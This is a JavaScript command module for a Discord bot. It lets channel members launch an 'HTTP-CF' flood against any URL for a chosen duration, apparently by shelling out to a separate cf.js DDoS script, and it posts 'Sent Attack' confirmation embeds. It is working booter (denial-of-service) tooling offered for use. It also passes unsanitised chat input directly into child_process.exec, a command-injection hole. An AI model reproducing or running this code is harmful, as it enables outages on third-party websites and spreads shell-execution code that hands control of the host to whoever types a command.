const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;HTTP-CF https://example.com/ 60`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node cf.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('vn 𝐋𝐢𝐨𝐧 - 𝐒𝐞𝐧𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 vn')
	.setTimestamp()
  .setDescription("**𝓟𝓵𝓪𝓷**: `Member` \n **𝐓𝐚𝐫𝐠𝐞𝐭** : `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝𝐬** : `𝐇𝐓𝐓𝐏-𝐂𝐅` \n **𝐓𝐈𝐌𝐄** : `" + duration + "`")
	.setFooter('© Developer: haanhtuan', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://i.pinimg.com/originals/26/63/0c/26630c81da261f767fa942a65720781c.gif", "https://i.pinimg.com/originals/26/63/0c/26630c81da261f767fa942a65720781c.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://i.gifer.com/Pbzw.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('vn 𝐋𝐢𝐨𝐧 - 𝐒𝐞𝐧𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 vn')
	.setTimestamp()
	.setDescription("vn [ Lion ] Please Wait !vn")
	.setFooter('𝗽𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘂𝘀', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTP-CF'],
  permLevel: 0
}

exports.help = {
  name: 'HTTP-CF',
  description: 'lionrexo',
  usage: 'HTTP-CF'
}